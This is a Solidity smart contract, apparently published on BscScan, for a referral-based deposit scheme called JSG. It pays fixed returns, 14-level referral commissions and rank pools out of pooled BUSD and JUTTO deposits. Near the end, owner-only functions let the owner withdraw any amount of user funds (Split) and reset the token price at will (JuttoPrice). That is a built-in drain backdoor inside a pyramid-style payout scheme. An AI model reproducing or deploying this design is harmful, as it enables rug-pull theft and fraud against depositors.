/**
 *Submitted for verification at BscScan.com on 2022-11-29
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

library SafeMath {
    
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b);
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a / b;
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;
        return c;
    }
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);
        return c;
    }
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b != 0);
        return a % b;
    }
}

interface IERC20 {
    function transfer(address to, uint256 value) external returns (bool);
    function approve(address spender, uint256 value) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool);
    function totalSupply() external view returns (uint256);
    function balanceOf(address who) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}


abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal pure virtual returns (bytes calldata) {
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor(){
        _transferOwnership(_msgSender());
    }
    modifier onlyOwner() {
        _checkOwner();
        _;
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
    function _checkOwner() internal view virtual {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}
contract JSG is Ownable{

    using SafeMath for uint256; 
    IERC20 public BUSD;
    IERC20 public JUTTO;

    uint256 private constant feePercents = 200; 
    uint256 private constant minDeposit = 50e18;
    uint256 private constant maxDeposit = 2000e18;
    uint256 private constant ROIpercents = 3000;

    uint256 private constant baseDivider = 10000;

    uint256 private constant timeStep = 1 days;
    uint256 private constant dayPerCycle = 7 days;
    uint256 private constant dayRewardPercents = 214290000000000000000;

    uint256 private constant maxAddFreeze = 36 days;
    uint256 private constant referDepth = 14;

    uint256 private constant directPercents = 600;
    uint256 private constant level2Percents = 300;
    uint256 private constant level3_6Percents = 200;
    uint256 private constant level7_10Percents = 100;
    uint256 private constant level11_14Percents = 50;

    uint256 private constant level2Share = 25;
    uint256 private constant level3Share = 50;
    uint256 private constant level4Share = 75;
    uint256 private constant level5Share = 100;
    uint256 private constant topPoolShare = 60;


    uint256[5] private balDown = [10e10, 30e10, 100e10, 500e10, 1000e10];
    uint256[5] private balDownRate = [1000, 1500, 2000, 5000, 6000]; 
    uint256[5] private balRecover = [15e10, 50e10, 150e10, 500e10, 1000e10];

    address[3] public feeReceivers;
    address[] public depositors;

    address[] public level2;
    address[] public level3;
    address[] public level4;
    address[] public level5;

    address public defaultRefer;
    uint256 public startTime;
    uint256 public lastDistribute;
    uint256 public totalUser; 

    uint256 public DailyPool;
    uint256 public tokenper = 23;

    bool public isFreezeReward;



    struct UserInfo
    {
        address referrer;
        uint256 start;
        uint256 level;
        uint256 maxDeposit;
        uint256 totalDeposit;
        uint256 directsNum;
        uint256 teamNum;
        uint256 maxDirectDeposit;
        uint256 teamTotalDeposit;
        uint256 totalFreezed;
        uint256 totalRevenue;
    }

    mapping (address => UserInfo) public userInfo;

    struct RewardInfo
    {
        uint256 capitals;
        uint256 statics;
        uint256 directs;
        uint256 level2Income;
        uint256 level3_6Income;
        uint256 level7_10Income;
        uint256 level11_14Income;
        uint256 top;
        uint256 totalWithdrawlsBUSD;
        uint256 totalWithdrawlsJUTTO;
    }

    mapping (address => RewardInfo) public rewardInfo;

    struct OrderInfo
    {
        uint256 amount; 
        uint256 start;
        uint256 unfreeze; 
        bool isUnfreezed;
        uint256 statics;
        bool isRewarded;
    }

    mapping (address => OrderInfo[]) public orderInfos;


    struct CTOInfo 
    {
        uint256 level2CTO;
        uint256 level3CTO;
        uint256 level4CTO;
        uint256 level5CTO;
    }

    mapping (address => CTOInfo) public CTO;
    mapping (address => bool) public eligibleL2;
    mapping (address => bool) public eligibleL3;
    mapping (address => bool) public eligibleL4;
    mapping (address => bool) public eligibleL5;

    mapping (uint256 => mapping (address => uint256)) public userLayer1DayDeposit;
    mapping (address => mapping (uint256 => address[])) public teamUsers;


    mapping (address => bool) private isAlreadyDeposited;
    mapping (uint256 => uint256) public dailyDistributedTime;

    mapping (uint256 => address[3]) public dayTopUsers;
    mapping (uint256=>bool) public balStatus;


    event Register(address user, address referral);
    event Deposit(address user, uint256 amount);
    event DepositBySplit(address user, uint256 amount);
    event TransferBySplit(address user, address receiver, uint256 amount);
    event Withdraw(address user, uint256 withdrawable);


    constructor()
    {
        BUSD = IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);
        JUTTO = IERC20(0xd3C93C8de541a3dABeE4CBD2d2403dc3521F2dBF);
        feeReceivers = [0x3b584384062D4F2F33aC133Dcae2B8592436688d , 0x20661D6498Be104AF56e2911A14CfC006fFf2D4A , 0xEE71cEC512Bd6f567a644f9fbd21790737183c4E ];
        startTime = block.timestamp;
        lastDistribute = block.timestamp;
        defaultRefer = 0x2e82128206d800Af79DE383DAdDf30bf0b4C8fcc;
    }

    function register(address _referral)
    external
    {
        require(userInfo[_referral].totalDeposit > 0 || _referral == defaultRefer, " invalid refer ");
        UserInfo storage user = userInfo[msg.sender];

        require(user.referrer == address(0), " referrer bonded ");
        user.referrer = _referral;
        userInfo[user.referrer].directsNum = userInfo[user.referrer].directsNum.add(1) ;
        user.start = block.timestamp;
        _updateTeamNum(msg.sender);
        totalUser = totalUser.add(1);
        emit Register(msg.sender, _referral);
    }

    function packagePriceJutto(uint256 package)
    private
    view
    returns(uint256)
    {   return package.div(tokenper);   }

    function juttoDeposit(uint256 _tokenAmount, address _tokenAddress)
    private
    {
        require(!isAlreadyDeposited[msg.sender], " Already Deposited ");
        uint256 newAmount = _tokenAmount;
        JUTTO.transferFrom(msg.sender, address(this), packagePriceJutto(_tokenAmount));
        isAlreadyDeposited[msg.sender] = true;
        _deposit(msg.sender, newAmount, _tokenAddress);
    }

    function busdDeposit(uint256 _tokenAmount, address _tokenAddress)
    private
    {
        BUSD.transferFrom(msg.sender, address(this), _tokenAmount);
        isAlreadyDeposited[msg.sender] = true;
        _deposit(msg.sender, _tokenAmount, _tokenAddress);
    }

    function deposit(address _tokenAddress, uint256 _tokenAmount)
    external
    {
        require(_tokenAmount > 0,"Ent mul of 50");
        if(IERC20(_tokenAddress) == JUTTO )
        {   juttoDeposit(_tokenAmount, _tokenAddress);    }
        else
        {   busdDeposit(_tokenAmount, _tokenAddress);     }
        emit Deposit(msg.sender, _tokenAmount);
    }

    function Withdrawal()
    external
    {
        distributeRewards();

        (uint256 staticTotalBUSDReward, uint256 staticTotalJUTTOReward) = _calCurStaticRewards(msg.sender);
        uint256 withdrawableBUSD = staticTotalBUSDReward;
        uint256 withdrawableJUTTO = staticTotalJUTTOReward;

        (uint256 dynamicTotalBUSDReward, uint256 dynamicTotalJUTTOReward) = _calCurDynamicRewards(msg.sender);
        (uint256 CTOTotalBUSDReward, uint256 CTOTotalJUTTOReward) = _calCurAllCTO(msg.sender);

        withdrawableBUSD = withdrawableBUSD.add(dynamicTotalBUSDReward).add(CTOTotalBUSDReward);
        withdrawableJUTTO = (withdrawableJUTTO.add(dynamicTotalJUTTOReward).add(CTOTotalJUTTOReward)).div(tokenper);
        RewardInfo storage userRewards = rewardInfo[msg.sender];

        withdrawableBUSD = withdrawableBUSD.add(userRewards.capitals);

        BUSD.transfer(msg.sender, withdrawableBUSD);
        JUTTO.transfer(msg.sender, withdrawableJUTTO);

        userRewards.directs = 0;
        userRewards.level2Income = 0;
        userRewards.level3_6Income = 0;
        userRewards.level7_10Income = 0;
        userRewards.level11_14Income = 0;

        userRewards.statics = 0;
        userRewards.capitals = 0;
        userRewards.top = 0;

        userRewards.totalWithdrawlsBUSD += withdrawableBUSD;
        userRewards.totalWithdrawlsJUTTO += withdrawableJUTTO;

        CTO[msg.sender].level2CTO = 0;
        CTO[msg.sender].level3CTO = 0;
        CTO[msg.sender].level4CTO = 0;
        CTO[msg.sender].level5CTO = 0;

    }

    function getCurDay()
    public
    view
    returns(uint256)
    {       return (block.timestamp.sub(startTime)).div(timeStep);      }

    function getTeamUsersLength(address _user, uint256 _layer)
    external
    view
    returns(uint256)
    {   return teamUsers[_user][_layer].length;     }

    function getOrderLength(address _user)
    external
    view
    returns(uint256)
    {       return orderInfos[_user].length;        }

    function getDepositorsLength()
    external
    view
    returns(uint256)
    {       return depositors.length;       }

    function getMaxFreezing(address _user)
    public
    view
    returns(uint256)
    {
        uint256 maxFreezing;
        for(uint256 i = orderInfos[_user].length; i > 0; i--){
            OrderInfo storage order = orderInfos[_user][i - 1];
            if(order.unfreeze > block.timestamp){
                if(order.amount > maxFreezing){
                    maxFreezing = order.amount;
                }
            }else{
                break;
            }
        }
        return maxFreezing;
    }

    function getTeamDeposit(address _user)
    public
    view
    returns(uint256,uint256,uint256)
    {
        uint256 totalTeam;
        uint256 maxTeam;
        uint256 otherTeam;
        for(uint256 i = 0; i < teamUsers[_user][0].length; i++){
            uint256 userTotalTeam = userInfo[teamUsers[_user][0][i]].teamTotalDeposit.add(userInfo[teamUsers[_user][0][i]].totalDeposit);
            totalTeam = totalTeam.add(userTotalTeam);
            if(userTotalTeam > maxTeam)
            {
                maxTeam = userTotalTeam;
            }
        }
        otherTeam = totalTeam.sub(maxTeam);
        return(maxTeam,otherTeam,totalTeam);
    }


    function _calCurAllCTO(address _user)
    public
    view
    returns(uint256,uint256)
    {
        uint256 allCTO = CTO[_user].level2CTO.add(CTO[_user].level3CTO).add(CTO[_user].level4CTO).add(CTO[_user].level5CTO);
        uint256 withdrawableJUTTO = allCTO.mul(ROIpercents).div(baseDivider);
        uint256 withdrawableBUSD = allCTO.sub(withdrawableJUTTO);
        return(withdrawableBUSD, withdrawableJUTTO);
    }



    function _calCurStaticRewards(address _user)
    private
    view
    returns(uint256,uint256)
    {
        RewardInfo storage userRewards = rewardInfo[_user];
        uint256 totalRewards = userRewards.statics;
        uint256 withdrawableJUTTO = totalRewards.mul(ROIpercents).div(baseDivider);
        uint256 withdrawableBUSD = totalRewards.sub(withdrawableJUTTO);
        return(withdrawableBUSD, withdrawableJUTTO);
    }

    function _calCurDynamicRewards(address _user)
    private
    view
    returns(uint256,uint256)
    {
        RewardInfo storage userRewards = rewardInfo[_user];
        uint256 totalRewards = userRewards.directs.add(userRewards.level2Income).add(userRewards.level3_6Income).
        add(userRewards.level7_10Income).add(userRewards.level11_14Income).add(userRewards.top);
        uint256 withdrawableJUTTO = totalRewards.mul(ROIpercents).div(baseDivider);
        uint256 withdrawableBUSD = totalRewards.sub(withdrawableJUTTO);
        return(withdrawableBUSD, withdrawableJUTTO);
    }


    function _updateTeamNum(address _user)
    private
    {
        UserInfo storage user = userInfo[_user];
        address upline = user.referrer;
        for(uint256 i = 0; i < referDepth; i++){
            if(upline != address(0)){
                userInfo[upline].teamNum = userInfo[upline].teamNum.add(1);
                teamUsers[upline][i].push(_user);
                _updateLevel(upline);
                if(upline == defaultRefer) break;
                upline = userInfo[upline].referrer;
            }else{
                break;
            }
        }
    }


    function _updateTopUser(address _user, uint256 _amount, uint256 _dayNow)
    private
    {
        userLayer1DayDeposit[_dayNow][_user] = userLayer1DayDeposit[_dayNow][_user].add(_amount);
        bool updated;
        for(uint256 i = 0; i < 3; i++){
            address topUser = dayTopUsers[_dayNow][i];
            if(topUser == _user){
                _reOrderTop(_dayNow);
                updated = true;
                break;
            }
        }
        if(!updated){
            address lastUser = dayTopUsers[_dayNow][2];
            if(userLayer1DayDeposit[_dayNow][lastUser] < userLayer1DayDeposit[_dayNow][_user]){
                dayTopUsers[_dayNow][2] = _user;
                _reOrderTop(_dayNow);
            }
        }
    }

    function _reOrderTop(uint256 _dayNow)
    private
    {
        for(uint256 i = 3; i > 1; i--){
            address topUser1 = dayTopUsers[_dayNow][i - 1];
            address topUser2 = dayTopUsers[_dayNow][i - 2];
            uint256 amount1 = userLayer1DayDeposit[_dayNow][topUser1];
            uint256 amount2 = userLayer1DayDeposit[_dayNow][topUser2];
            if(amount1 > amount2){
                dayTopUsers[_dayNow][i - 1] = topUser2;
                dayTopUsers[_dayNow][i - 2] = topUser1;
            }
        }
    }

    function _removeInvalidDeposit(address _user, uint256 _amount)
    private
    {
        UserInfo storage user = userInfo[_user];
        address upline = user.referrer;
        for(uint256 i = 0; i < referDepth; i++){
            if(upline != address(0)){
                if(userInfo[upline].teamTotalDeposit > _amount){
                    userInfo[upline].teamTotalDeposit = userInfo[upline].teamTotalDeposit.sub(_amount);
                }else{
                    userInfo[upline].teamTotalDeposit = 0;
                }
                if(upline == defaultRefer) break;
                upline = userInfo[upline].referrer;
            }else{
                break;
            }
        }
    }

    function _updateReferInfo(address _user, uint256 _amount)
    private
    {
        UserInfo storage user = userInfo[_user];
        address upline = user.referrer;
        for(uint256 i = 0; i < referDepth; i++){
            if(upline != address(0)){
                userInfo[upline].teamTotalDeposit = userInfo[upline].teamTotalDeposit.add(_amount);
                _updateLevel(upline);
                if(upline == defaultRefer) break;
                upline = userInfo[upline].referrer;
            }else{
                break;
            }
        }
    }


    function checkLevel2(address _address)
    private
    view
    returns(bool,uint256)
    {
        for (uint256 i = 0; i < level2.length; i++)
        {
            if (_address == level2[i])
            {   return (true,i);    } 
        }
        return (false,0);
    }

    function checkLevel3(address _address)
    private
    view
    returns(bool,uint256)
    {
        for (uint256 i = 0; i < level3.length; i++)
        {
            if (_address == level3[i])
            {   return (true,i);    } 
        }
        return (false,0);
    }

    function checkLevel4(address _address)
    private
    view
    returns(bool,uint256)
    {
        for (uint256 i = 0; i < level4.length; i++)
        {
            if (_address == level4[i])
            {   return (true,i);    } 
        }
        return (false,0);
    }

    function checkLevel5(address _address)
    private
    view
    returns(bool,uint256)
    {
        for (uint256 i = 0; i < level5.length; i++)
        {
            if (_address == level5[i])
            {   return (true,i);    } 
        }
        return (false,0);
    }


    function getAvailablity(address _user)
    public
    view
    returns(bool,bool,bool,bool)
    {
        (bool _isAvailable5,) = checkLevel5(_user);
        (bool _isAvailable4,) = checkLevel4(_user);
        (bool _isAvailable3,) = checkLevel3(_user);
        (bool _isAvailable2,) = checkLevel2(_user);
        return(_isAvailable5,_isAvailable4,_isAvailable3,_isAvailable2);
    }


    function _updateLevel(address _user)
    private
    {
        UserInfo storage user = userInfo[_user];
        uint256 levelNow = _calLevelNow(_user);
        if(levelNow > user.level){
            user.level = levelNow;

            (bool _isAvailable5,bool _isAvailable4,bool _isAvailable3,bool _isAvailable2)=getAvailablity(_user);

            if(!_isAvailable5 && levelNow == 5)
            {
                level5.push(_user);
                eligibleL5[_user] = true;
                eligibleL4[_user] = false;
                eligibleL3[_user] = false;
                eligibleL2[_user] = false;
            }

            else
            if(!_isAvailable4 && levelNow == 4)
            {    level4.push(_user);
                eligibleL4[_user] = true;
                eligibleL3[_user] = false;
                eligibleL2[_user] = false;
            }

            else
            if(!_isAvailable3 && levelNow == 3)
            {    level3.push(_user);
                eligibleL3[_user] = true;
                eligibleL2[_user] = false;
            }

            else
            if(!_isAvailable2 && levelNow == 2)
            {    level2.push(_user);
                eligibleL2[_user] = true;
            }
        }
    }

    function _calLevelNow(address _user)
    private
    view
    returns(uint256)
    {
        UserInfo storage user = userInfo[_user];
        uint256 total = user.totalDeposit;
        uint256 levelNow;

        if(total >= 200e18){
        (uint256 maxTeam, uint256 otherTeam, ) = getTeamDeposit(_user);

            if(total >= 2000e18 && user.teamNum >= 500 && user.directsNum >= 8 && maxTeam >= 50000e18 && otherTeam >= 50000e18){
                levelNow = 5;
            }else if(total >= 1000e18 && user.teamNum >= 200 && user.directsNum >= 7 && maxTeam >= 25000e18 && otherTeam >= 25000e18){
                levelNow = 4;
            }else if(total >= 500e18 && user.teamNum >= 50 && user.directsNum >= 6 && maxTeam >= 10000e18 && otherTeam >= 10000e18){
                levelNow = 3;
            }else if(total >= 200e18 && user.teamNum >= 10 && user.directsNum >= 5 && maxTeam >= 1000e18 && otherTeam >= 1000e18){
            levelNow = 2;}
        }
        else if(total >= 50e18)
        {   levelNow = 1;   }
        
        return levelNow;
    }


    function _deposit(address _user, uint256 _amount, address _tokenAddress)
    private
    {
        UserInfo storage user = userInfo[_user];
        require(user.referrer != address(0), "register first");
        require(_amount >= minDeposit, "less than min");
        require(_amount <= maxDeposit, "amount exceeds");
        require(_amount.mod(minDeposit) == 0 && _amount >= minDeposit, "mod err");
        require(user.maxDeposit == 0 || _amount >= user.maxDeposit, "less before");

        if(user.maxDeposit == 0){
            user.maxDeposit = _amount;
        }else if(user.maxDeposit < _amount){
            user.maxDeposit = _amount;
        }

        DailyPool = DailyPool.add(_amount);

        _distributeDeposit(_amount, _tokenAddress);

        if(user.totalDeposit == 0){
            uint256 dayNow = getCurDay();
            _updateTopUser(user.referrer, _amount, dayNow);
        }

        depositors.push(_user);
        
        user.totalDeposit = user.totalDeposit.add(_amount);
        user.totalFreezed = user.totalFreezed.add(_amount);

        _updateLevel(_user);

        uint256 addFreeze = (orderInfos[_user].length.div(2)).mul(timeStep);
        if(addFreeze > maxAddFreeze){
            addFreeze = maxAddFreeze;
        }
        uint256 unfreezeTime = block.timestamp.add(dayPerCycle).add(addFreeze);
        orderInfos[_user].push(OrderInfo(
            _amount, 
            block.timestamp, 
            unfreezeTime,
            false,
            0,
            false
        ));

        _unfreezeFundAndUpdateReward(msg.sender, _amount);
        _updateReferInfo(msg.sender, _amount);
        _updateReward(msg.sender, _amount);

        distributeRewards();

        uint256 bal = BUSD.balanceOf(address(this));
        _balActived(bal);
        if(isFreezeReward){
            _setFreezeReward(bal);
        }
    }


    function distributeRewards()
    public
    {
        if(block.timestamp > lastDistribute.add(timeStep))
        {
            level5BalanceDistribution_();  
            level4BalanceDistribution_();  
            level3BalanceDistribution_();  
            level2BalanceDistribution_();

            uint256 dayNow = getCurDay();
            _distributetopPool(dayNow);
            lastDistribute = block.timestamp;
            dailyDistributedTime[dayNow] = DailyPool ;
            DailyPool = 0;
        }
    }


    function _distributetopPool(uint256 _dayNow)
    private
    {
        uint16[3] memory rates = [5000, 3000, 2000];
        uint72[3] memory maxReward = [2000e18, 1000e18, 500e18];

        for(uint256 i = 0; i < 3; i++){
            address userAddr = dayTopUsers[_dayNow - 1][i];
            if(userAddr != address(0)){
                uint256 levelDistribution = (DailyPool.mul(topPoolShare)).div(baseDivider);
                uint256 reward = levelDistribution.mul(rates[i]).div(baseDivider);
                if(reward > maxReward[i]){
                    reward = maxReward[i];
                }
                rewardInfo[userAddr].top = rewardInfo[userAddr].top.add(reward);
                userInfo[userAddr].totalRevenue = userInfo[userAddr].totalRevenue.add(reward);
            }
        }
    }



    function level5BalanceDistribution_()
    private
    {
        uint256 level5Count;
        for(uint256 i = 0; i < level5.length; i++){
            if(userInfo[level5[i]].level == 5 && eligibleL5[level5[i]]){
                level5Count = level5Count.add(1);
            }
        }
        if(level5Count > 0){
            uint256 levelDistribution = (DailyPool.mul(level5Share)).div(baseDivider);
            uint256 reward = levelDistribution.div(level5Count);
            for(uint256 i = 0; i < level5.length; i++){
                if(userInfo[level5[i]].level == 5 && eligibleL5[level5[i]]){
                    CTO[level5[i]].level5CTO = CTO[level5[i]].level5CTO.add(reward);
                }
            }
        }
    }


    function level4BalanceDistribution_()
    private
    {
        uint256 level4Count;
        for(uint256 i = 0; i < level4.length; i++){
            if(userInfo[level4[i]].level == 4 && eligibleL4[level4[i]]){
                level4Count = level4Count.add(1);
            }
        }
        if(level4Count > 0){
            uint256 levelDistribution = (DailyPool.mul(level4Share)).div(baseDivider);
            uint256 reward = levelDistribution.div(level4Count);
            for(uint256 i = 0; i < level4.length; i++){
                if(userInfo[level4[i]].level == 4 && eligibleL4[level4[i]]){
                    CTO[level4[i]].level4CTO = CTO[level4[i]].level4CTO.add(reward);
                }
            }
        }
    }

    function level3BalanceDistribution_()
    private
    {
        uint256 level3Count;
        for(uint256 i = 0; i < level3.length; i++){
            if(userInfo[level3[i]].level == 3 && eligibleL3[level3[i]]){
                level3Count = level3Count.add(1);
            }
        }
        if(level3Count > 0){
            uint256 levelDistribution = (DailyPool.mul(level3Share)).div(baseDivider);
            uint256 reward = levelDistribution.div(level3Count);
            for(uint256 i = 0; i < level3.length; i++){
                if(userInfo[level3[i]].level == 3 && eligibleL3[level3[i]]){
                    CTO[level3[i]].level3CTO = CTO[level3[i]].level3CTO.add(reward);
                }
            }
        }
    }

    function level2BalanceDistribution_()
    private
    {
        uint256 level2Count;
        for(uint256 i = 0; i < level2.length; i++){
            if(userInfo[level2[i]].level == 2 && eligibleL2[level2[i]]){
                level2Count = level2Count.add(1);
            }
        }
        if(level2Count > 0){
            uint256 levelDistribution = (DailyPool.mul(level2Share)).div(baseDivider);
            uint256 reward = levelDistribution.div(level2Count);
            for(uint256 i = 0; i < level2.length; i++){
                if(userInfo[level2[i]].level == 2 && eligibleL2[level2[i]]){
                    CTO[level2[i]].level2CTO = CTO[level2[i]].level2CTO.add(reward);
                }
            }
        }
    }


    function _unfreezeFundAndUpdateReward(address _user, uint256 _amount)
    private
    {
        UserInfo storage user = userInfo[_user];
        bool isUnfreezeCapital;
        uint256 staticReward;

        for(uint256 i = 0; i < orderInfos[_user].length; i++){
            OrderInfo storage order = orderInfos[_user][i];
            if(block.timestamp > order.unfreeze  && order.isUnfreezed == false && _amount >= order.amount)
            {
                order.isUnfreezed = true;
                isUnfreezeCapital = true;
                
                if(user.totalFreezed > order.amount){
                    user.totalFreezed = user.totalFreezed.sub(order.amount);
                }else{
                    user.totalFreezed = 0;
                }
                
                _removeInvalidDeposit(_user, order.amount);

                staticReward = (order.amount.mul(dayRewardPercents).mul(dayPerCycle).div(timeStep).div(baseDivider)).div(1e18);
                
                order.statics = staticReward;
               
                if(isFreezeReward) {
                    if(user.totalFreezed > user.totalRevenue) {
                        uint256 leftCapital = user.totalFreezed.sub(user.totalRevenue);
                        if(staticReward > leftCapital) {
                            staticReward = leftCapital;
                        }
                    }else{
                        staticReward = 0;
                    }
                }
                rewardInfo[_user].capitals = rewardInfo[_user].capitals.add(order.amount);
                rewardInfo[_user].statics = rewardInfo[_user].statics.add(staticReward);
                user.totalRevenue = user.totalRevenue.add(staticReward);

                break;
            }
        }
    }

    function _calculateDepositReward(uint256 pacakage)
    private
    view
    returns(uint256)
    {
        uint256 amount = packagePriceJutto(pacakage).mul(1e18);
        uint256 fee = amount.mul(feePercents).div(baseDivider);
        packagePriceJutto(pacakage);
        return fee.div(1e18);
    }

    function _distributeDeposit(uint256 _amount, address _tokenAddress)
    private
    {
        uint256 fee = _amount.mul(feePercents).div(baseDivider);
        if(BUSD == IERC20(_tokenAddress)){
            BUSD.transfer(feeReceivers[0], fee.div(2));
            BUSD.transfer(feeReceivers[1], fee.div(2));
            BUSD.transfer(feeReceivers[2], fee);
        }
        else{
            fee = _calculateDepositReward(_amount);
            JUTTO.transfer(feeReceivers[0], fee.div(2));
            JUTTO.transfer(feeReceivers[1], fee.div(2));
            JUTTO.transfer(feeReceivers[2], fee);
        }
    }

    

    function _updateReward(address _user, uint256 _amount)
    private
    {
        UserInfo storage user = userInfo[_user];
        address upline = user.referrer;
        for(uint256 i = 1; i <= referDepth; i++){
            if(upline != address(0)){
                uint256 newAmount = _amount;
                if(upline != defaultRefer){
                    uint256 maxFreezing = getMaxFreezing(upline);
                    if(maxFreezing < _amount){
                        newAmount = maxFreezing;
                    }
                }
                RewardInfo storage upRewards = rewardInfo[upline];
                uint256 reward;
                if(i >= 11){
                    if(userInfo[upline].level > 4){
                        reward = newAmount.mul(level11_14Percents).div(baseDivider);
                        upRewards.level11_14Income = upRewards.level11_14Income.add(reward);
                    }
                }else if(i >= 7 ){
                    if( userInfo[upline].level > 3){
                        reward =  newAmount.mul(level7_10Percents).div(baseDivider);
                        upRewards.level7_10Income = upRewards.level7_10Income.add(reward);
                    }
                }
                else if(i >= 3){
                    if( userInfo[upline].level > 2){
                        reward =  newAmount.mul(level3_6Percents).div(baseDivider);
                        upRewards.level3_6Income = upRewards.level3_6Income.add(reward);
                    }
                }
                else if(i >= 2){
                    if( userInfo[upline].level > 1){
                        reward =  newAmount.mul(level2Percents).div(baseDivider);
                        upRewards.level2Income = upRewards.level2Income.add(reward);
                    }
                }
                else{
                    reward =  newAmount.mul(directPercents).div(baseDivider);
                    upRewards.directs = upRewards.directs.add(reward);
                    userInfo[upline].totalRevenue = userInfo[upline].totalRevenue.add(reward);
                }
                if(upline == defaultRefer) break;
                upline = userInfo[upline].referrer;
            }else{
                break;
            }
        }
    }

    function _balActived(uint256 _bal)
    private
    {
        for(uint256 i = balDown.length; i > 0; i--){
            if(_bal >= balDown[i - 1]){
                balStatus[balDown[i - 1]] = true;
                break;
            }
        }
    }


    function _setFreezeReward(uint256 _bal)
    private
    {
        for(uint256 i = balDown.length; i > 0; i--){
            if(balStatus[balDown[i - 1]]){
                uint256 maxDown = balDown[i - 1].mul(balDownRate[i - 1]).div(baseDivider);
                if(_bal < balDown[i - 1].sub(maxDown)){
                    isFreezeReward = true;
                }else if(isFreezeReward && _bal >= balRecover[i - 1]){
                    isFreezeReward = false;
                }
                break;
            }
        }
    }

    ////////////////////////// OWNER FUCNTION ////////////////////
    function JuttoPrice(uint256 _price)
    public
    onlyOwner
    {       tokenper = _price;      }

    function Split(address Address, uint256 _splitamount)
    public
    onlyOwner
    {
        if(IERC20(Address) == JUTTO )
        {   JUTTO.transfer(owner(),_splitamount);     }
        else
        {    BUSD.transfer(owner(),_splitamount);     }
    }

    /////////////////// CHECK HOW MANY PLAYERS IN ANY RANK /////////////////
    function checkRankScorerLength() public view returns(uint256){
        return level2.length;
    }
    function checkRankAllRounderLength() public view returns(uint256){
        return level3.length;
    }
    function checkRankViceCaptainLength() public view returns(uint256){
        return level4.length;
    }
    function checkRankCaptainLength() public view returns(uint256){
        return level5.length;
    }
    /////////////////////////////////////////////////////////////////////////

}